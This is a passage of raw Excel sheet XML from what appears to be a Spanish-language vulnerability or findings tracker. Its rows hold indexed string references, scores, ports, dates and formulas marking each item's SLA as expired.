      <c r="U241" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1067</v>
      </c>
      <c r="V241" s="8">
        <f t="shared" si="10"/>
        <v>45172</v>
      </c>
      <c r="W241" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X241" s="12"/>
      <c r="Y241" s="11"/>
      <c r="Z241" s="11"/>
      <c r="AA241" s="8">
        <v>45177</v>
      </c>
      <c r="AB241" s="32" t="s">
        <v>987</v>
      </c>
      <c r="AC241" s="32" t="s">
        <v>985</v>
      </c>
      <c r="AD241" s="9"/>
      <c r="AE241" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF241" s="5"/>
      <c r="AG241" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH241" t="str">
        <f>IFERROR(VLOOKUP(H241,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="242" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A242" s="5">
        <v>241</v>
      </c>
      <c r="B242" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C242" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D242" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E242" s="4"/>
      <c r="F242" s="4"/>
      <c r="G242" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H242" s="4" t="s">
        <v>988</v>
      </c>
      <c r="I242" s="4"/>
      <c r="J242" s="4" t="s">
        <v>574</v>
      </c>
      <c r="K242" s="6"/>
      <c r="L242" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M242" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N242" s="5"/>
      <c r="O242" s="14"/>
      <c r="P242" s="10"/>
      <c r="Q242" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R242" s="4"/>
      <c r="S242" s="22"/>
      <c r="T242" s="8">
        <v>45142</v>
      </c>
      <c r="U242" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1067</v>
      </c>
      <c r="V242" s="8">
        <f t="shared" si="10"/>
        <v>45232</v>
      </c>
      <c r="W242" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X242" s="12"/>
      <c r="Y242" s="11"/>
      <c r="Z242" s="11"/>
      <c r="AA242" s="8">
        <v>45464</v>
      </c>
      <c r="AB242" s="32" t="s">
        <v>990</v>
      </c>
      <c r="AC242" s="32" t="s">
        <v>991</v>
      </c>
      <c r="AD242" s="9"/>
      <c r="AE242" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF242" s="27" t="s">
        <v>733</v>
      </c>
      <c r="AG242" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH242" t="str">
        <f>IFERROR(VLOOKUP(H242,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="243" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A243" s="5">
        <v>242</v>
      </c>
      <c r="B243" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C243" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D243" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E243" s="4"/>
      <c r="F243" s="4"/>
      <c r="G243" s="60" t="s">
        <v>867</v>
      </c>
      <c r="H243" s="4" t="s">
        <v>992</v>
      </c>
      <c r="I243" s="4"/>
      <c r="J243" s="4" t="s">
        <v>971</v>
      </c>
      <c r="K243" s="6"/>
      <c r="L243" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M243" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N243" s="5">
        <v>5.3</v>
      </c>
      <c r="O243" s="14"/>
      <c r="P243" s="10"/>
      <c r="Q243" s="6" t="s">
        <v>993</v>
      </c>
      <c r="R243" s="4"/>
      <c r="S243" s="22"/>
      <c r="T243" s="8">
        <v>45177</v>
      </c>
      <c r="U243" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>1032</v>
      </c>
      <c r="V243" s="8">
        <f t="shared" si="10"/>
        <v>45267</v>
      </c>
      <c r="W243" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X243" s="12"/>
      <c r="Y243" s="11"/>
      <c r="Z243" s="11"/>
      <c r="AA243" s="8"/>
      <c r="AB243" s="32" t="s">
        <v>994</v>
      </c>
      <c r="AC243" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD243" s="9"/>
      <c r="AE243" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF243" s="27" t="s">
        <v>973</v>
      </c>
      <c r="AG243" s="27" t="s">
        <v>875</v>
      </c>
      <c r="AH243" t="str">
        <f>IFERROR(VLOOKUP(H243,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="244" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A244" s="5">
        <v>243</v>
      </c>
      <c r="B244" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C244" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D244" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E244" s="4"/>
      <c r="F244" s="4"/>
      <c r="G244" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H244" s="4" t="s">
        <v>995</v>
      </c>
      <c r="I244" s="4"/>
      <c r="J244" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K244" s="6"/>
      <c r="L244" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M244" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N244" s="5">
        <v>5.3</v>
      </c>
      <c r="O244" s="14"/>
      <c r="P244" s="10"/>
      <c r="Q244" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R244" s="4"/>
      <c r="S244" s="22"/>
      <c r="T244" s="8">
        <v>45212</v>
      </c>
      <c r="U244" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>997</v>
      </c>
      <c r="V244" s="8">
        <f t="shared" si="10"/>
        <v>45302</v>
      </c>
      <c r="W244" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X244" s="12"/>
      <c r="Y244" s="11"/>
      <c r="Z244" s="11"/>
      <c r="AA244" s="8">
        <v>45233</v>
      </c>
      <c r="AB244" s="32" t="s">
        <v>996</v>
      </c>
      <c r="AC244" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD244" s="9"/>
      <c r="AE244" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF244" s="5"/>
      <c r="AG244" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH244" t="str">
        <f>IFERROR(VLOOKUP(H244,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="245" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A245" s="5">
        <v>244</v>
      </c>
      <c r="B245" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C245" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D245" s="5"/>
      <c r="E245" s="4"/>
      <c r="F245" s="4"/>
      <c r="G245" s="6" t="s">
        <v>739</v>
      </c>
      <c r="H245" s="4" t="s">
        <v>997</v>
      </c>
      <c r="I245" s="4"/>
      <c r="J245" s="4" t="s">
        <v>998</v>
      </c>
      <c r="K245" s="6"/>
      <c r="L245" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M245" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N245" s="5">
        <v>5</v>
      </c>
      <c r="O245" s="14"/>
      <c r="P245" s="10"/>
      <c r="Q245" s="6" t="s">
        <v>999</v>
      </c>
      <c r="R245" s="4">
        <v>80</v>
      </c>
      <c r="S245" s="22"/>
      <c r="T245" s="8">
        <v>45250</v>
      </c>
      <c r="U245" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>959</v>
      </c>
      <c r="V245" s="8">
        <f t="shared" si="10"/>
        <v>45340</v>
      </c>
      <c r="W245" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X245" s="12"/>
      <c r="Y245" s="11"/>
      <c r="Z245" s="11"/>
      <c r="AA245" s="8">
        <v>45267</v>
      </c>
      <c r="AB245" s="32" t="s">
        <v>1000</v>
      </c>
      <c r="AC245" s="32" t="s">
        <v>1001</v>
      </c>
      <c r="AD245" s="9"/>
      <c r="AE245" s="8"/>
      <c r="AF245" s="27" t="s">
        <v>1002</v>
      </c>
      <c r="AG245" s="27" t="s">
        <v>747</v>
      </c>
      <c r="AH245" t="str">
        <f>IFERROR(VLOOKUP(H245,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="246" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A246" s="5">
        <v>245</v>
      </c>
      <c r="B246" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C246" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D246" s="5"/>
      <c r="E246" s="4"/>
      <c r="F246" s="4"/>
      <c r="G246" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H246" s="4" t="s">
        <v>1003</v>
      </c>
      <c r="I246" s="4"/>
      <c r="J246" s="4" t="s">
        <v>998</v>
      </c>
      <c r="K246" s="6"/>
      <c r="L246" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M246" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N246" s="5">
        <v>5</v>
      </c>
      <c r="O246" s="14"/>
      <c r="P246" s="10"/>
      <c r="Q246" s="6" t="s">
        <v>176</v>
      </c>
      <c r="R246" s="4">
        <v>80</v>
      </c>
      <c r="S246" s="22"/>
      <c r="T246" s="8">
        <v>45250</v>
      </c>
      <c r="U246" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>959</v>
      </c>
      <c r="V246" s="8">
        <f t="shared" si="10"/>
        <v>45340</v>
      </c>
      <c r="W246" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X246" s="12"/>
      <c r="Y246" s="11"/>
      <c r="Z246" s="11"/>
      <c r="AA246" s="8">
        <v>45267</v>
      </c>
      <c r="AB246" s="32" t="s">
        <v>1000</v>
      </c>
      <c r="AC246" s="32" t="s">
        <v>1001</v>
      </c>
      <c r="AD246" s="9"/>
      <c r="AE246" s="8"/>
      <c r="AF246" s="27" t="s">
        <v>1002</v>
      </c>
      <c r="AG246" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH246" t="str">
        <f>IFERROR(VLOOKUP(H246,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="247" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A247" s="5">
        <v>246</v>
      </c>
      <c r="B247" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C247" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D247" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E247" s="4"/>
      <c r="F247" s="4"/>
      <c r="G247" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H247" s="4" t="s">
        <v>1004</v>
      </c>
      <c r="I247" s="4"/>
      <c r="J247" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K247" s="6"/>
      <c r="L247" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M247" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N247" s="5">
        <v>5.3</v>
      </c>
      <c r="O247" s="14"/>
      <c r="P247" s="10"/>
      <c r="Q247" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R247" s="4">
        <v>443</v>
      </c>
      <c r="S247" s="22"/>
      <c r="T247" s="8">
        <v>45250</v>
      </c>
      <c r="U247" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>959</v>
      </c>
      <c r="V247" s="8">
        <f t="shared" si="10"/>
        <v>45340</v>
      </c>
      <c r="W247" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X247" s="12"/>
      <c r="Y247" s="11"/>
      <c r="Z247" s="11"/>
      <c r="AA247" s="8">
        <v>45247</v>
      </c>
      <c r="AB247" s="32" t="s">
        <v>1005</v>
      </c>
      <c r="AC247" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD247" s="9"/>
      <c r="AE247" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF247" s="27"/>
      <c r="AG247" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH247" t="str">
        <f>IFERROR(VLOOKUP(H247,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="248" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A248" s="5">
        <v>247</v>
      </c>
      <c r="B248" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C248" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D248" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E248" s="4"/>
      <c r="F248" s="4"/>
      <c r="G248" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H248" s="4" t="s">
        <v>1006</v>
      </c>
      <c r="I248" s="4"/>
      <c r="J248" s="4" t="s">
        <v>890</v>
      </c>
      <c r="K248" s="6"/>
      <c r="L248" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M248" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N248" s="5">
        <v>5</v>
      </c>
      <c r="O248" s="14"/>
      <c r="P248" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q248" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R248" s="4">
        <v>443</v>
      </c>
      <c r="S248" s="22"/>
      <c r="T248" s="8">
        <v>41598</v>
      </c>
      <c r="U248" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V248" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W248" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X248" s="12"/>
      <c r="Y248" s="11"/>
      <c r="Z248" s="11"/>
      <c r="AA248" s="8">
        <v>45273</v>
      </c>
      <c r="AB248" s="32" t="s">
        <v>1008</v>
      </c>
      <c r="AC248" s="32" t="s">
        <v>1009</v>
      </c>
      <c r="AD248" s="9" t="s">
        <v>1010</v>
      </c>
      <c r="AE248" s="8"/>
      <c r="AF248" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG248" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH248" t="str">
        <f>IFERROR(VLOOKUP(H248,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="249" spans="1:34" ht="188.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A249" s="5">
        <v>248</v>
      </c>
      <c r="B249" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C249" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D249" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E249" s="4"/>
      <c r="F249" s="4"/>
      <c r="G249" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H249" s="4" t="s">
        <v>1011</v>
      </c>
      <c r="I249" s="4"/>
      <c r="J249" s="4" t="s">
        <v>1012</v>
      </c>
      <c r="K249" s="6"/>
      <c r="L249" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M249" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N249" s="5">
        <v>6.8</v>
      </c>
      <c r="O249" s="14"/>
      <c r="P249" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q249" s="6"/>
      <c r="R249" s="4">
        <v>443</v>
      </c>
      <c r="S249" s="22"/>
      <c r="T249" s="8">
        <v>41598</v>
      </c>
      <c r="U249" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V249" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W249" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X249" s="12"/>
      <c r="Y249" s="11"/>
      <c r="Z249" s="11"/>
      <c r="AA249" s="8">
        <v>45273</v>
      </c>
      <c r="AB249" s="32" t="s">
        <v>1013</v>
      </c>
      <c r="AC249" s="32" t="s">
        <v>1014</v>
      </c>
      <c r="AD249" s="9" t="s">
        <v>1015</v>
      </c>
      <c r="AE249" s="8"/>
      <c r="AF249" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG249" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH249" t="str">
        <f>IFERROR(VLOOKUP(H249,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="250" spans="1:34" ht="145" hidden="1" x14ac:dyDescent="0.35">
      <c r="A250" s="5">
        <v>249</v>
      </c>
      <c r="B250" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C250" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D250" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E250" s="4"/>
      <c r="F250" s="4"/>
      <c r="G250" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H250" s="4" t="s">
        <v>1016</v>
      </c>
      <c r="I250" s="4"/>
      <c r="J250" s="4" t="s">
        <v>1017</v>
      </c>
      <c r="K250" s="6"/>
      <c r="L250" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M250" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N250" s="5">
        <v>5</v>
      </c>
      <c r="O250" s="14"/>
      <c r="P250" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q250" s="6"/>
      <c r="R250" s="4">
        <v>443</v>
      </c>
      <c r="S250" s="22"/>
      <c r="T250" s="8">
        <v>41598</v>
      </c>
      <c r="U250" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V250" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W250" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X250" s="12"/>
      <c r="Y250" s="11"/>
      <c r="Z250" s="11"/>
      <c r="AA250" s="8">
        <v>45273</v>
      </c>
      <c r="AB250" s="32" t="s">
        <v>1018</v>
      </c>
      <c r="AC250" s="32" t="s">
        <v>1019</v>
      </c>
      <c r="AD250" s="9" t="s">
        <v>1020</v>
      </c>
      <c r="AE250" s="8"/>
      <c r="AF250" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG250" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH250" t="str">
        <f>IFERROR(VLOOKUP(H250,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="251" spans="1:34" ht="217.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A251" s="5">
        <v>250</v>
      </c>
      <c r="B251" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C251" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D251" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E251" s="4"/>
      <c r="F251" s="4"/>
      <c r="G251" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H251" s="4" t="s">
        <v>1021</v>
      </c>
      <c r="I251" s="4"/>
      <c r="J251" s="4" t="s">
        <v>1022</v>
      </c>
      <c r="K251" s="6"/>
      <c r="L251" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M251" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N251" s="5">
        <v>4.3</v>
      </c>
      <c r="O251" s="14"/>
      <c r="P251" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q251" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R251" s="4">
        <v>443</v>
      </c>
      <c r="S251" s="22"/>
      <c r="T251" s="8">
        <v>41598</v>
      </c>
      <c r="U251" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V251" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W251" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X251" s="12"/>
      <c r="Y251" s="11"/>
      <c r="Z251" s="11"/>
      <c r="AA251" s="8">
        <v>45273</v>
      </c>
      <c r="AB251" s="32" t="s">
        <v>1023</v>
      </c>
      <c r="AC251" s="32" t="s">
        <v>1024</v>
      </c>
      <c r="AD251" s="9" t="s">
        <v>1025</v>
      </c>
      <c r="AE251" s="8"/>
      <c r="AF251" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG251" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH251" t="str">
        <f>IFERROR(VLOOKUP(H251,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="252" spans="1:34" ht="101.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A252" s="5">
        <v>251</v>
      </c>
      <c r="B252" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C252" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D252" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E252" s="4"/>
      <c r="F252" s="4"/>
      <c r="G252" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H252" s="4" t="s">
        <v>1026</v>
      </c>
      <c r="I252" s="4"/>
      <c r="J252" s="4" t="s">
        <v>1027</v>
      </c>
      <c r="K252" s="6"/>
      <c r="L252" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M252" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N252" s="5">
        <v>5</v>
      </c>
      <c r="O252" s="14"/>
      <c r="P252" s="10" t="s">
        <v>1007</v>
      </c>
      <c r="Q252" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R252" s="4">
        <v>443</v>
      </c>
      <c r="S252" s="22"/>
      <c r="T252" s="8">
        <v>41598</v>
      </c>
      <c r="U252" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>4611</v>
      </c>
      <c r="V252" s="8">
        <f t="shared" si="10"/>
        <v>41688</v>
      </c>
      <c r="W252" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X252" s="12"/>
      <c r="Y252" s="11"/>
      <c r="Z252" s="11"/>
      <c r="AA252" s="8">
        <v>45273</v>
      </c>
      <c r="AB252" s="32" t="s">
        <v>1028</v>
      </c>
      <c r="AC252" s="32" t="s">
        <v>1029</v>
      </c>
      <c r="AD252" s="9" t="s">
        <v>1030</v>
      </c>
      <c r="AE252" s="8"/>
      <c r="AF252" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG252" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH252" t="str">
        <f>IFERROR(VLOOKUP(H252,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="253" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A253" s="5">
        <v>252</v>
      </c>
      <c r="B253" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C253" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D253" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E253" s="4"/>
      <c r="F253" s="4"/>
      <c r="G253" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H253" s="4" t="s">
        <v>1031</v>
      </c>
      <c r="I253" s="4"/>
      <c r="J253" s="4" t="s">
        <v>459</v>
      </c>
      <c r="K253" s="6"/>
      <c r="L253" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M253" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N253" s="5">
        <v>5.3</v>
      </c>
      <c r="O253" s="14"/>
      <c r="P253" s="10"/>
      <c r="Q253" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R253" s="4"/>
      <c r="S253" s="22"/>
      <c r="T253" s="8">
        <v>45262</v>
      </c>
      <c r="U253" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>947</v>
      </c>
      <c r="V253" s="8">
        <f t="shared" si="10"/>
        <v>45352</v>
      </c>
      <c r="W253" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X253" s="12"/>
      <c r="Y253" s="11"/>
      <c r="Z253" s="11"/>
      <c r="AA253" s="8">
        <v>45271</v>
      </c>
      <c r="AB253" s="32" t="s">
        <v>1032</v>
      </c>
      <c r="AC253" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD253" s="9"/>
      <c r="AE253" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF253" s="27" t="s">
        <v>684</v>
      </c>
      <c r="AG253" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH253" t="str">
        <f>IFERROR(VLOOKUP(H253,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="254" spans="1:34" ht="43.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A254" s="5">
        <v>253</v>
      </c>
      <c r="B254" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C254" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D254" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E254" s="4"/>
      <c r="F254" s="4"/>
      <c r="G254" s="6" t="s">
        <v>138</v>
      </c>
      <c r="H254" s="4" t="s">
        <v>1033</v>
      </c>
      <c r="I254" s="4" t="s">
        <v>1034</v>
      </c>
      <c r="J254" s="4" t="s">
        <v>1035</v>
      </c>
      <c r="K254" s="6"/>
      <c r="L254" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M254" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N254" s="5">
        <v>3.7</v>
      </c>
      <c r="O254" s="14"/>
      <c r="P254" s="10"/>
      <c r="Q254" s="6" t="s">
        <v>143</v>
      </c>
      <c r="R254" s="4"/>
      <c r="S254" s="22"/>
      <c r="T254" s="8">
        <v>45260</v>
      </c>
      <c r="U254" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>949</v>
      </c>
      <c r="V254" s="8">
        <f t="shared" si="10"/>
        <v>45380</v>
      </c>
      <c r="W254" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X254" s="12"/>
      <c r="Y254" s="11"/>
      <c r="Z254" s="11"/>
      <c r="AA254" s="8">
        <v>45692</v>
      </c>
      <c r="AB254" s="32" t="s">
        <v>1036</v>
      </c>
      <c r="AC254" s="32" t="s">
        <v>1037</v>
      </c>
      <c r="AD254" s="9" t="s">
        <v>1038</v>
      </c>
      <c r="AE254" s="27" t="s">
        <v>1039</v>
      </c>
      <c r="AF254" s="27" t="s">
        <v>148</v>
      </c>
      <c r="AG254" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH254" t="str">
        <f>IFERROR(VLOOKUP(H254,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="255" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A255" s="5">
        <v>254</v>
      </c>
      <c r="B255" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C255" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D255" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E255" s="4"/>
      <c r="F255" s="4"/>
      <c r="G255" s="6" t="s">
        <v>445</v>
      </c>
      <c r="H255" s="4" t="s">
        <v>1040</v>
      </c>
      <c r="I255" s="4" t="s">
        <v>1041</v>
      </c>
      <c r="J255" s="4" t="s">
        <v>1042</v>
      </c>
      <c r="K255" s="6"/>
      <c r="L255" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M255" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N255" s="5">
        <v>4.2</v>
      </c>
      <c r="O255" s="14" t="s">
        <v>1043</v>
      </c>
      <c r="P255" s="10"/>
      <c r="Q255" s="6" t="s">
        <v>989</v>
      </c>
      <c r="R255" s="4"/>
      <c r="S255" s="22"/>
      <c r="T255" s="8">
        <v>45393</v>
      </c>
      <c r="U255" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>816</v>
      </c>
      <c r="V255" s="8">
        <f t="shared" si="10"/>
        <v>45483</v>
      </c>
      <c r="W255" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X255" s="12"/>
      <c r="Y255" s="11"/>
      <c r="Z255" s="11"/>
      <c r="AA255" s="8">
        <v>45503</v>
      </c>
      <c r="AB255" s="32" t="s">
        <v>1044</v>
      </c>
      <c r="AC255" s="32" t="s">
        <v>1045</v>
      </c>
      <c r="AD255" s="9" t="s">
        <v>1046</v>
      </c>
      <c r="AE255" s="8" t="s">
        <v>147</v>
      </c>
      <c r="AF255" s="27"/>
      <c r="AG255" s="27" t="s">
        <v>149</v>
      </c>
      <c r="AH255" t="str">
        <f>IFERROR(VLOOKUP(H255,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="256" spans="1:34" ht="409.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A256" s="5">
        <v>255</v>
      </c>
      <c r="B256" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C256" s="5" t="s">
        <v>425</v>
      </c>
      <c r="D256" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E256" s="4"/>
      <c r="F256" s="4"/>
      <c r="G256" s="6" t="s">
        <v>171</v>
      </c>
      <c r="H256" s="4"/>
      <c r="I256" s="4"/>
      <c r="J256" s="4" t="s">
        <v>1047</v>
      </c>
      <c r="K256" s="6"/>
      <c r="L256" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M256" s="5" t="s">
        <v>1048</v>
      </c>
